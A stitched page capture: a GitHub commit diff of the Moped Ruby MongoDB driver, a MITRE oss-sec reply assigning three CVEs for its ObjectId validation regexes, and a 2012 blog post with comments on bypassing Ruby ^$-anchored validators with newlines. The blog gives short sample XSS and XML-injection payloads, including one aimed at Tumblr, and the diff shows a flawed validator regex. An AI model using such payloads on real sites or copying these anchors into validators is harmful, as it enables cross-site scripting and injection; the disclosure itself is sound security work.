|  |  | of a node's networking code. Allows you to `rescue Moped::SocketError` which |
|  |  | preserving the real exception.</td></tr> |
|  |  |  |
|  |  | </tbody></table> |
|  |  |  |
|  |  | Other exceptions are possible while running commands, such as IO Errors around |
|  |  | failed connections. Moped tries to be smart about managing its connections, |
|  |  | such as checking if they're dead before executing a command; but those checks |
|  |  | aren't foolproof, and Moped is conservative about handling unexpected errors on |
|  |  | its connections. Namely, Moped will \*not\* retry a command if an unexpected |
|  |  | exception is raised. Why? Because it's impossible to know whether the command |
|  |  | was actually received by the remote Mongo instance, and without domain |
|  |  | knowledge it cannot be safely retried. |
|  |  |  |
|  |  | Take for example this case: |
|  |  |  |
|  |  | ```ruby |
|  |  | session.with(safe: true)["users"].insert(name: "John") |
|  |  | ``` |
|  |  |  |
|  |  | It's entirely possible that the insert command will be sent to Mongo, but the |
|  |  | connection gets closed before we read the result for `getLastError`. In this |
|  |  | case, there's no way to know whether the insert was actually successful! |
|  |  |  |
|  |  | If, however, you want to gracefully handle this in your own application, you |
|  |  | could do something like: |
|  |  |  |
|  |  | ```ruby |
|  |  | document = { \_id: Moped::BSON::ObjectId.new, name: "John" } |
|  |  |  |
|  |  | begin |
|  |  | session["users"].insert(document) |
|  |  | rescue Moped::Errors::SocketError |
|  |  | session["users"].find(\_id: document[:\_id]).upsert(document) |
|  |  | end |
|  |  | ``` |
|  |  |  |
|  |  | # Replica Sets |
|  |  |  |
|  |  | Moped has full support for replica sets including automatic failover and node |
|  |  | discovery. |
|  |  |  |
|  |  | ## Automatic Failover |
|  |  |  |
|  |  | Moped will automatically retry lost connections and attempt to detect dead |
|  |  | connections before sending an operation. Note, that it will \*not\* retry |
|  |  | individual operations! For example, these cases will work and not raise any |
|  |  | exceptions: |
|  |  |  |
|  |  | ```ruby |
|  |  | session[:users].insert(name: "John") |
|  |  | # kill primary node and promote secondary |
|  |  | session[:users].insert(name: "John") |
|  |  | session[:users].find.count # => 2.0 |
|  |  |  |
|  |  | # primary node drops our connection |
|  |  | session[:users].insert(name: "John") |
|  |  | ``` |
|  |  |  |
|  |  | However, you'll get an operation error in a case like: |
|  |  |  |
|  |  | ```ruby |
|  |  | # primary node goes down while reading the reply |
|  |  | session.with(safe: true)[:users].insert(name: "John") |
|  |  | ``` |
|  |  |  |
|  |  | And you'll get a connection error in a case like: |
|  |  |  |
|  |  | ```ruby |
|  |  | # primary node goes down, no new primary available yet |
|  |  | session[:users].insert(name: "John") |
|  |  | ``` |
|  |  |  |
|  |  | If your session is running with eventual consistency, read operations will |
|  |  | never raise connection errors as long as any secondary or primary node is |
|  |  | running. The only case where you'll see a connection failure is if a node goes |
|  |  | down while attempting to retrieve more results from a cursor, because cursors |
|  |  | are tied to individual nodes. |
|  |  |  |
|  |  | When two attempts to connect to a node fail, it will be marked as down. This |
|  |  | removes it from the list of available nodes for `:down\_interval` (default 30 |
|  |  | seconds). Note that the `:down\_interval` only applies to normal operations; |
|  |  | that is, if you ask for a primary node and none is available, all nodes will be |
|  |  | retried. Likewise, if you ask for a secondary node, and no secondary or primary |
|  |  | node is available, all nodes will be retreied. |
|  |  |  |
|  |  | ## Node Discovery |
|  |  |  |
|  |  | The addresses you pass into your session are used as seeds for setting up |
|  |  | replica set connections. After connection, each seed node will return a list of |
|  |  | other known nodes which will be added to the set. |
|  |  |  |
|  |  | This information is cached according to the `:refresh\_interval` option (default: |
|  |  | 5 minutes). That means, e.g., that if you add a new node to your replica set, |
|  |  | it should be represented in Moped within 5 minutes. |
|  |  |  |
|  |  | # Thread-Safety |
|  |  |  |
|  |  | Moped is thread-safe -- depending on your definition of thread-safe. For Moped, |
| Expand Down | |  |

6 changes: 4 additions & 2 deletions

6
[lib/moped.rb](#diff-3032bf346ac0fd40723d55049bb40879907c89a46d26c15f33cb499e0f63f6f3 "lib/moped.rb")

Show comments

[View file](/mongoid/moped/blob/dd5a7c14b5d2e466f7875d079af71ad19774609b/lib/moped.rb)
Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -6,14 +6,16 @@ |
|  |  | require "moped/bson" |
|  |  | require "moped/cluster" |
|  |  | require "moped/collection" |
|  |  | require "moped/connection" |
|  |  | require "moped/cursor" |
|  |  | require "moped/database" |
|  |  | require "moped/errors" |
|  |  | require "moped/indexes" |
|  |  | require "moped/logging" |
|  |  | require "moped/node" |
|  |  | require "moped/protocol" |
|  |  | require "moped/query" |
|  |  | require "moped/server" |
|  |  | require "moped/session" |
|  |  | require "moped/socket" |
|  |  | require "moped/session/context" |
|  |  | require "moped/threaded" |
|  |  | require "moped/version" |

82 changes: 31 additions & 51 deletions

82
[lib/moped/bson/object\_id.rb](#diff-9c68b3e8872ca0f129def2917b61f0eb165c65c923854e45a4f0b7d4751231f9 "lib/moped/bson/object_id.rb")

Show comments

[View file](/mongoid/moped/blob/dd5a7c14b5d2e466f7875d079af71ad19774609b/lib/moped/bson/object_id.rb)
Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -8,31 +8,33 @@ class ObjectId |
|  |  | # Formatting string for outputting an ObjectId. |
|  |  | @@string\_format = ("%02x" \* 12).freeze |
|  |  |  |
|  |  | attr\_reader :data |
|  |  |  |
|  |  | class << self |
|  |  | def from\_string(string) |
|  |  | raise Errors::InvalidObjectId.new(string) unless legal?(string) |
|  |  | data = [] |
|  |  | data = "" |
|  |  | 12.times { |i| data << string[i\*2, 2].to\_i(16) } |
|  |  | new data |
|  |  | from\_data data |
|  |  | end |
|  |  |  |
|  |  | def from\_time(time) |
|  |  | from\_data @@generator.generate(time.to\_i) |
|  |  | end |
|  |  |  |
|  |  | def legal?(str) |
|  |  | !!str.match(/^[0-9a-f]{24}$/i) |
|  |  | !!str.match(/\A\h{24}\Z/i) |
|  |  | end |
|  |  | end |
|  |  |  |
|  |  | def initialize(data = nil, time = nil) |
|  |  | if data |
|  |  | @data = data |
|  |  | elsif time |
|  |  | @data = @@generator.generate(time.to\_i) |
|  |  | else |
|  |  | @data = @@generator.next |
|  |  | def from\_data(data) |
|  |  | id = allocate |
|  |  | id.instance\_variable\_set :@data, data |
|  |  | id |
|  |  | end |
|  |  | end |
|  |  |  |
|  |  | def data |
|  |  | @data ||= @@generator.next |
|  |  | end |
|  |  |  |
|  |  | def ==(other) |
|  |  | BSON::ObjectId === other && data == other.data |
|  |  | end |
| Expand All | | @@ -43,78 +45,56 @@ def hash |
|  |  | end |
|  |  |  |
|  |  | def to\_s |
|  |  | @@string\_format % data |
|  |  | @@string\_format % data.unpack("C12") |
|  |  | end |
|  |  |  |
|  |  | # Return the UTC time at which this ObjectId was generated. This may |
|  |  | # be used instread of a created\_at timestamp since this information |
|  |  | # is always encoded in the object id. |
|  |  | def generation\_time |
|  |  | Time.at(@data.pack("C4").unpack("N")[0]).utc |
|  |  | Time.at(data.unpack("N")[0]).utc |
|  |  | end |
|  |  |  |
|  |  | class << self |
|  |  | def \_\_bson\_load\_\_(io) |
|  |  | new io.read(12).unpack('C\*') |
|  |  | from\_data(io.read(12)) |
|  |  | end |
|  |  |  |
|  |  | end |
|  |  |  |
|  |  | def \_\_bson\_dump\_\_(io, key) |
|  |  | io << Types::OBJECT\_ID |
|  |  | io << key |
|  |  | io << NULL\_BYTE |
|  |  | io << data.pack('C12') |
|  |  | io << data |
|  |  | end |
|  |  |  |
|  |  | # @api private |
|  |  | class Generator |
|  |  | def initialize |
|  |  | # Generate and cache 3 bytes of identifying information from the current |
|  |  | # machine. |
|  |  | @machine\_id = Digest::MD5.digest(Socket.gethostname).unpack("C3") |
|  |  | @machine\_id = Digest::MD5.digest(Socket.gethostname).unpack("N")[0] |
|  |  |  |
|  |  | @mutex = Mutex.new |
|  |  | @last\_timestamp = nil |
|  |  | @counter = 0 |
|  |  | end |
|  |  |  |
|  |  | # Return object id data based on the current time, incrementing a |
|  |  | # counter for object ids generated in the same second. |
|  |  | # Return object id data based on the current time, incrementing the |
|  |  | # object id counter. |
|  |  | def next |
|  |  | now = Time.new.to\_i |
|  |  |  |
|  |  | counter = @mutex.synchronize do |
|  |  | last\_timestamp, @last\_timestamp = @last\_timestamp, now |
|  |  |  |
|  |  | if last\_timestamp == now |
|  |  | @counter += 1 |
|  |  | else |
|  |  | @counter = 0 |
|  |  | end |
|  |  | @mutex.lock |
|  |  | begin |
|  |  | counter = @counter = (@counter + 1) % 0xFFFFFF |
|  |  | ensure |
|  |  | @mutex.unlock rescue nil |
|  |  | end |
|  |  |  |
|  |  | generate(now, counter) |
|  |  | generate(Time.new.to\_i, counter) |
|  |  | end |
|  |  |  |
|  |  | # Generate object id data for a given time using the provided +inc+. |
|  |  | def generate(time, inc = 0) |
|  |  | pid = Process.pid % 0xFFFF |
|  |  |  |
|  |  | [ |
|  |  | time >> 24 & 0xFF, # 4 bytes time (network order) |
|  |  | time >> 16 & 0xFF, |
|  |  | time >> 8 & 0xFF, |
|  |  | time & 0xFF, |
|  |  | @machine\_id[0], # 3 bytes machine |
|  |  | @machine\_id[1], |
|  |  | @machine\_id[2], |
|  |  | pid >> 8 & 0xFF, # 2 bytes process id |
|  |  | pid & 0xFF, |
|  |  | inc >> 16 & 0xFF, # 3 bytes increment |
|  |  | inc >> 8 & 0xFF, |
|  |  | inc & 0xFF, |
|  |  | ] |
|  |  | # Generate object id data for a given time using the provided +counter+. |
|  |  | def generate(time, counter = 0) |
|  |  | [time, @machine\_id, Process.pid, counter << 8].pack("N NX lXX NX") |
|  |  | end |
|  |  | end |
|  |  |  |
| Expand Down | |  |

 Loading

Oops, something went wrong.
 Retry

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `dd5a7c1`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmongoid%2Fmoped%2Fcommit%2Fdd5a7c14b5d2e466f7875d079af71ad19774609b) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from seclists.org_eb0a311d_20250125_193514.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![oss-sec logo](/images/oss-sec-logo.png)](/oss-sec/)
## [oss-sec](/oss-sec/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](652)
[By Date](date.html#653)
[![Next](/images/right-icon-16x16.png)](654)

[![Previous](/images/left-icon-16x16.png)](651)
[By Thread](index.html#653)
[![Next](/images/right-icon-16x16.png)](652)

![](/shared/images/nst-icons.svg#search)

# Re: CVE Request: bson-ruby DoS and possible injection

---

*From*: cve-assign () mitre org

*Date*: Sat, 6 Jun 2015 12:03:50 -0400 (EDT)

---

```
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

```
> ```
> <http://sakurity.com/blog/2015/06/04/mongo_ruby_regexp.html>
>
> ```

```

As far as we can tell, this requires three CVE IDs because there were
three independent mistakes.

CVE-2015-4410 is for original 2012-01-23 implementation of legal?
using the ^[0-9a-f]{24}$ regular expression.

CVE-2015-4411 is for the bernerdschaefer 2012-04-17 commit in which
legal? began using the \A\h{24}\Z regular expression. The
mongo_ruby_regexp.html blog post describes this as "proper" but later
explains that it was problematic, in at least one context, because of
a minor DoS that would have been avoided if the correct \A\h{24}\z
(lowercase 'z') had been used instead.

CVE-2015-4412 is for the durran 2013-04-07 commit in which the
\A\h{24}\Z regular expression was changed to the ^[0-9a-f]{24}$
regular expression.

The copying of the original ^[0-9a-f]{24}$ mistake from Moped::BSON to
one or more other codebases doesn't require additional CVE IDs.

Similarly, the copying of the \A\h{24}\Z mistake or the second
^[0-9a-f]{24}$ mistake to one or more other codebases doesn't require
additional CVE IDs. (It's quite possible that no such copying ever
occurred.)

The claim in
<http://homakov.blogspot.ru/2012/05/saferweb-injects-in-various-ruby.html>
of:

  Regexp are just like cars - they should work as same and similar as
  it's possible. Breaking standard behavior by purpose and telling
  people "It's not a bug, it's a feature" looks so disgusting to me.
  It's not a feature, it's a vulnerability.

is not accepted as a Ruby vulnerability by the CVE project. There is
no CVE ID for the observation that Ruby regular-expression semantics
can be considered different from regular-expression semantics seen
elsewhere.

If there are other products (that otherwise qualify for CVE IDs) with
incorrect and security-relevant uses of ^$ in Ruby code, then there
can be additional CVE IDs for each independent codebase. For example,
referring to the "Showcases time" section of the
saferweb-injects-in-various-ruby.html page, there can't be a CVE ID
for GitHub.com (because it could be site-specific code) but there
could be a CVE ID if the issue affected a 2012 version (if one
existed) of the GitHub Enterprise product.

- --
CVE assignment team, MITRE CVE Numbering Authority
M/S M300
202 Burlington Road, Bedford, MA 01730 USA
[ PGP key available through <http://cve.mitre.org/cve/request_id.html> ]
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.14 (SunOS)

iQEcBAEBAgAGBQJVcxluAAoJEKllVAevmvmsrrcH/iywyYQPmcd+Bn6gkRKfxUsx
9TmAgV6lCztWgVR0kqTrBZC5GcACcZWV2jVEg/3RD3/fXH23ulqTvKZEZrbTVIHv
mDMH5WId3gimyNdy2IkNZqsKeeJxNi6rtWyg+QLD8M1+fLW9vrmRPYKN7VPcHWZX
ZTEauEFN0Gq+23hM01DUnXpnV1sErtGWceIXnvVKP1skyitgJYhz6SRmyL2+FQpc
iUAqTJUMeUlEvM40WxQPbX2Q7PeH0dIoNN4UmC2VE/RmzysIDhtaZQwsaFcMDpA3
wS8Lva/Ici4klxNUxdZsMEKxg1V7y1djlvRDbUlVpqHvrMZbTTkJraf8cbbZJik=
=o3AI
-----END PGP SIGNATURE-----

```

---

[![Previous](/images/left-icon-16x16.png)](652)
[By Date](date.html#653)
[![Next](/images/right-icon-16x16.png)](654)

[![Previous](/images/left-icon-16x16.png)](651)
[By Thread](index.html#653)
[![Next](/images/right-icon-16x16.png)](652)

### Current thread:

* [CVE Request: bson-ruby DoS and possible injection](651) *Phill MV (Jun 05)*
  + **Re: CVE Request: bson-ruby DoS and possible injection** *cve-assign (Jun 06)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from homakov.blogspot.ru_0c078ff5_20250125_193513.html ===


# [Egor Homakov](https://homakov.blogspot.com/)

Security consulting: [Sakurity](https://sakurity.com) Twitter: [@homakov](http://twitter.com/homakov). homakov@gmail.com

## Saturday, May 19, 2012

### Injects in Various Ruby Websites Through Regexp.

[On HN](http://news.ycombinator.com/item?id=3996127)

You are a web developer. Let's assume you are building a website using Ruby(and probably Rails or any other Ruby framework). This is why you need to validate some input params - to make sure that they don't contain any crap you don't want to be there. Come on, you are going to google it, right?:

1. Hmmm I need a regexp for emails. Googling: "regexp for email". Oh, nice one, I will use it.
2. Oh, I also seek a regexp for URLs. Easy: "regexp for url". So good, I love google and ruby!
3. This field must contain 3 capital letters - it's IATA code for an airport. I can do it by myself, I know regular expressions, I read some books! /^[A-Z]{3}$/ looks great!

Now you have ready regexps and you put them into your model, into controller, anywhere - it doesn't matter:
> validates :email, presence: true, format: EMAIL regexp from google
>
> validates :url, format: URL regexp from google
>
> validates :departure\_airport, presence: true, format: /^[A-Z]{3}$/

You can even test it tens times in console or development ENV - it will work... unless you know "the secret" with ruby Regexp.

**^ for start-of-string and $ for end-of-string ARE just new lines - \n!**

This is a common pattern to exploit them:
> any data
>
> proper data - valid for regexp
>
> any other data

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjGIzTZOZ_bYkfCPPbEjRUtN5VZY6h0L1q9dAGaLS-UFU2hCzd1NnKNNc4CAeZPUltnUJ7sJLj8s7S-GnnBtNY3kABnYBWdgoWtE4KzsUNX3mLJ0TDMvj6T9Qajqel-_BhxggVncM6-PvPW/s640/Screen+Shot+2012-05-19+at+10.06.06+AM.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjGIzTZOZ_bYkfCPPbEjRUtN5VZY6h0L1q9dAGaLS-UFU2hCzd1NnKNNc4CAeZPUltnUJ7sJLj8s7S-GnnBtNY3kABnYBWdgoWtE4KzsUNX3mLJ0TDMvj6T9Qajqel-_BhxggVncM6-PvPW/s1600/Screen%2BShot%2B2012-05-19%2Bat%2B10.06.06%2BAM.png)

Thus, all your regexps that use ^$ are CRAP and worth nothing! Throw them away, they don't make sure that input is safe and secure.

**XSS for your URL:**

> javascript:alert(1);exploit\_code();/\*
>
> http://hi.com
>
> \*/

**Inject for IATA code(it uses SOAP so some XML inject has very powerful impact):**
> <some xml><for reservation system to steal money>
>
> SXF
>
> </ending tags></going to [miami beach](//www.youtube.com/watch?v=Wg1V2OZL2Ho)>

Ruby doesn't give a sh\*t about it at all. "Meh, use \A \z, we are in multiline mode by default".

The vulnerability is known and described [in just a few paragraphs at rails security guide](http://guides.rubyonrails.org/security.html#regular-expressions). Example  is awful - why to add <script> to file name? Rails will escape it in html\_safe easily. Much better to demonstrate XSS in URL, Shell Inject or XML inject because they all are pretty dangerous.

You bought a car, you are driving on a highway, faster and faster. Then you see the wall - you are trying to stop the car asap.

Hey dude, didn't you read **300pages-manual? Page 253**: "Brake is located on the roof of the car". pwned.

Regexp are just like cars - they should work as same and similar as it's possible. Breaking standard behavior by purpose and telling people "It's not a bug, it's a feature" looks so disgusting to me. **It's not a feature, it's a vulnerability**.
## **Showcases time.**

[Github.com](http://github.com/)(with a picture :3, fixed)

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhn0m46OcOKDpQrHnzKfhyWgOflEq1Apxzhlhd-y7ys22Ets9O5508ALrhaoTs4JxUrK7aBjnoP9u1jMWTKSQ5iLdnFbaRPs0llD6dw3dLxwsyXUxBxwvactXZedqLst9YnvwGmGh1944Ur/s320/Screen+Shot+2012-05-14+at+1.30.13+AM.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhn0m46OcOKDpQrHnzKfhyWgOflEq1Apxzhlhd-y7ys22Ets9O5508ALrhaoTs4JxUrK7aBjnoP9u1jMWTKSQ5iLdnFbaRPs0llD6dw3dLxwsyXUxBxwvactXZedqLst9YnvwGmGh1944Ur/s1600/Screen%2BShot%2B2012-05-14%2Bat%2B1.30.13%2BAM.png)

[scribd.com](http://scribd.com/)(the same, fixed)

<http://www.workingwithrails.com/person/19433-egor-homakov>

<http://soundcloud.com/egor-homakov> (songkick link)

[tumblr.com](http://tumblr.com/) - awesome hack(tricky parser there) and easy-to-use, just put smth like this:
> javascript:%0A
>
> =(Code\_to\_Reblog();code\_to\_open\_the\_link();)//
>
> http://hi.com

That's it! Of course I can find much more - but for what? I am 90% sure that your ruby project uses $^ in URL regexp too. I am so much sure because I would do the same, and this is really OK. Old versions of devise and authlogic and a lot of other gems are built with vulnerable regexps.

**This is how to check:**You have <input> field. Just turn it into <textarea> using WebInspector - now you can use new lines w/o all the mess with \n and %0A.

Author:

[homakov](https://draft.blogger.com/profile/10492045246792330280 "author profile")

on

[8:21 AM](https://homakov.blogspot.com/2012/05/saferweb-injects-in-various-ruby.html "permanent link")

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://draft.blogger.com/post-edit.g?blogID=8508344381521415235&postID=2357912800052888521&from=pencil "Edit Post")

#### 34 comments:

1. ![]()[taw](https://draft.blogger.com/profile/16972845140253292628)[May 19, 2012 at 8:44 AM](https://homakov.blogspot.com/2012/05/saferweb-injects-in-various-ruby.html?showComment=1337442289215#c8814713349869087023)

   I thought everybody knew to use \A \z in Ruby since forever. ^ and $ and pretty much always the wrong thing to use, and not just due to security.

   Reply[Delete](https://draft.blogger.com/delete-comment.g?blogID=8508344381521415235&postID=8814713349869087023)Replies
   Reply
2. ![]()[homakov](https://draft.blogger.com/profile/10492045246792330280)[May 19, 2012 at 9:52 AM](https://homakov.blogspot.com/2012/05/saferweb-injects-in-various-ruby.html?showComment=1337446359509#c427600256794145703)

   @taw
   I hope it to be true. But it's not. MOST of rubyists don't know about this and there is no way to teach everybody. Stop fighting walls, you cannot rewrite standards!

   "I thought everybody knew" is really my favorite sentence in security. I heard it a lot and had some fun then.

   Reply[Delete](https://draft.blogger.com/delete-comment.g?blogID=8508344381521415235&postID=427600256794145703)Replies
   Reply
3. ![]()[Fuzz Leonard](http://www.fuzzleonard.com)[May 19, 2012 at 10:42 AM](https://homakov.blogspot.com/2012/05/saferweb-injects-in-various-ruby.html?showComment=1337449327186#c6879278105985562683)

   Isn't Tumblr PHP?

   Reply[Delete](https://draft.blogger.com/delete-comment.g?blogID=8508344381521415235&postID=6879278105985562683)Replies
   Reply
4. ![]()[homakov](https://draft.blogger.com/profile/10492045246792330280)[May 19, 2012 at 11:05 AM](https://homakov.blogspot.com/2012/05/saferweb-injects-in-various-ruby.html?showComment=1337450727060#c3469502949210967376)

   @fuzz
   of course no, it wouldn't work in that case

   Reply[Delete](https://draft.blogger.com/delete-comment.g?blogID=8508344381521415235&postID=3469502949210967376)Replies
   Reply
5. ![]()Anonymous[May 19, 2012 at 2:55 PM](https://homakov.blogspot.com/2012/05/saferweb-injects-in-various-ruby.html?showComment=1337464503866#c5247907368349902549)

   хомаков я тебе чето не верю насчет тумблера
   http://highscalability.com/blog/2012/2/13/tumblr-architecture-15-billion-page-views-a-month-and-harder.html

   Reply[Delete](https://draft.blogger.com/delete-comment.g?blogID=8508344381521415235&postID=5247907368349902549)Replies
   Reply
6. ![]()Anonymous[May 19, 2012 at 3:17 PM](https://homakov.blogspot.com/2012/05/saferweb-injects-in-various-ruby.html?showComment=1337465826154#c1042381360514954870)

   Good research, Egor!
   I'm not Ruby programmer, but from time to time I read pieces of Ruby code. And I really even could not imagine before read your post that these ^$ has so perversive sense in regexp in Ruby.

   Reply[Delete](https://draft.blogger.com/delete-comment.g?blogID=8508344381521415235&postID=1042381360514954870)Replies
   Reply
7. ![]()[homakov](https://draft.blogger.com/profile/10492045246792330280)[May 19, 2012 at 5:07 PM](https://homakov.blogspot.com/2012/05/saferweb-injects-in-various-ruby.html?showComment=1337472455676#c5945676419111567046)

   @anon1
   просто проверь. все работает если немного поиследовать, разумеется я не буду выкладывать рабочий инжект.
   @anon2
   exactly. Most of us didn't know. That's what the post is about.

   Reply[Delete](https://draft.blogger.com/delete-comment.g?blogID=8508344381521415235&postID=5945676419111567046)Replies
   Reply
8. ![]()Dirkjan Bussink[May 20, 2012 at 8:01 AM](https://homakov.blogspot.com/2012/05/saferweb-injects-in-various-ruby.html?showComment=1337526097528#c8160232009665086438)

   This actually doesn't have anything to do with Ruby specific, but it is how regular expression work in general. So personally I've always expected ^ and $ to mean start of line and end of line and never start and end of text.

   This is the case in every programming language I've worked in that has regular expressions, such as Ruby, Perl, Java, C# and others. Multiline matching is also optional on all these platforms.

   http://en.wikipedia.org/wiki/Regular\_expression

   Reply[Delete](https://draft.blogger.com/delete-comment.g?blogID=8508344381521415235&postID=8160232009665086438)Replies
   - ![]()[Sam Kimbrel](http://shutupandclickit.com/)[May 29, 2012 at 9:56 AM](https://homakov.blogspot.com/2012/05/saferweb-injects-in-various-ruby.html?showComment=1338310611504#c3490865052548494190)

     All of the languages you mention (except Ruby) treat ^ and $ as beginning/end of string until you \*explicitly\* enable MULTILINE (/m). Where did you get the idea that they don't?

     [Delete](https://draft.blogger.com/delete-comment.g?blogID=8508344381521415235&postID=3490865052548494190)Replies
     Reply
   Reply
9. ![]()Anonymous[May 20, 2012 at 9:11 AM](https://homakov.blogspot.com/2012/05/saferweb-injects-in-various-ruby.html?showComment=1337530288272#c3784010939507696343)

   Nce except the suggestion to change the Ruby regexp behavior. It's naive to think regexps are used only for valiadations. And since there is always \A \Z solution, it's simply user/dev error.

   Reply[Delete](https://draft.blogger.com/delete-comment.g?blogID=8508344381521415235&postID=3784010939507696343)Replies
   Reply
10. ![]()[homakov](https://draft.blogger.com/profile/10492045246792330280)[May 21, 2012 at 1:05 AM](https://homakov.blogspot.com/2012/05/saferweb-injects-in-various-ruby.html?showComment=1337587528135#c511482069209763987)

    @dbussink
    yes, I know, this is how regexp work. It's all just "details". The problem is multiline mode by default, that was I meaning.

    And I am personally OK with that. I use \A\z. But all silly books/casts I know about regex use ^$ - that's the point. It's impossible to change minds rapidly. Very difficult.

    Thanks for your response.

    @anon
    OK I don't mind changing ruby/minds. I mind fixing the problem. And I don't know 100% which of the ways will work. But I know my post will help people who never knew about this - I hope it was helpful to them :)

    Reply[Delete](https://draft.blogger.com/delete-comment.g?blogID=8508344381521415235&postID=511482069209763987)Replies
    Reply
11. ![]()Anonymous[May 21, 2012 at 12:08 PM](https://homakov.blogspot.com/2012/05/saferweb-injects-in-various-ruby.html?showComment=1337627289568#c3542973027143447389)

    "test\nhttp://asdfasdf".search(/^http:/) // -1

    <?php
    $s = "test\nhttp://asdfasdf";
    var\_dump(preg\_match('/^http:/', $s)); // 0

    Lol, next one ruby problem

    Reply[Delete](https://draft.blogger.com/delete-comment.g?blogID=8508344381521415235&postID=3542973027143447389)Replies
    Reply
12. ![]()[homakov](https://draft.blogger.com/profile/10492045246792330280)[May 21, 2012 at 8:58 PM](https://homakov.blogspot.com/2012/05/saferweb-injects-in-various-ruby.html?showComment=1337659119457#c4063182607139677860)

    @anon yep, I would not care at all in the case if some other language would do the same. But in this case ruby is "unique" in the bad meaning of that word.

    Reply[Delete](https://draft.blogger.com/delete-comment.g?blogID=8508344381521415235&postID=4063182607139677860)Replies
    Reply
13. ![]()[Marek A.](https://draft.blogger.com/profile/14500118211906528901)[May 22, 2012 at 12:26 AM](https://homakov.blogspot.com/2012/05/saferweb-injects-in-various-ruby.html?showComment=1337671615895#c4870977686141997216)

    Thanks for attracting on the problem.

    I thing, that Ruby is a good language, but many people writing Rails tutorials on the web dont know some its differences. This problem was discussed in 2009 on http://caiustheory.com/validating-data-with-regular-expressions-in-ruby

    Reply[Delete](https://draft.blogger.com/delete-comment.g?blogID=8508344381521415235&postID=4870977686141997216)Replies
    Reply
14. ![]()[homakov](https://draft.blogger.com/profile/10492045246792330280)[May 22, 2012 at 12:50 AM](https://homakov.blogspot.com/2012/05/saferweb-injects-in-various-ruby.html?showComment=1337673041928#c3814484504500735776)

    @Marek. yes, cool. still wonder why those guys in showcases don't care this thing. If it was discussed 100 times why I still find it working. That's what makes me cry over here :D

    Reply[Delete](https://draft.blogger.com/delete-comment.g?blogID=8508344381521415235&postID=3814484504500735776)Replies
    Reply
15. ![]()Anonymous[May 24, 2012 at 6:10 AM](https://homakov.blogspot.com/2012/05/saferweb-injects-in-various-ruby.html?showComment=1337865016985#c7805262758666036127)

    Thanks for bringing this to my attention. Yet another bullet point to my list of reasons to stay away from Ruby.

    Reply[Delete](https://draft.blogger.com/delete-comment.g?blogID=8508344381521415235&postID=7805262758666036127)Replies
    Reply
16. ![]()Anonymous[May 24, 2012 at 7:15 AM](https://homakov.blogspot.com/2012/05/saferweb-injects-in-various-ruby.html?showComment=1337868955965#c5046306993683053022)

    Good Lord! Keep the ignorance and misdirection coming folks.

    Keep blaming other people/software because you didn't bother to learn standard RegEx syntax that has been around for at least a couple decades.

    Please don't allow any critical thinking into your head or you might realize that the distinction between \A and ^ is both necessary and useful.

    Reply[Delete](https://draft.blogger.com/delete-comment.g?blogID=8508344381521415235&postID=5046306993683053022)Replies
    Reply
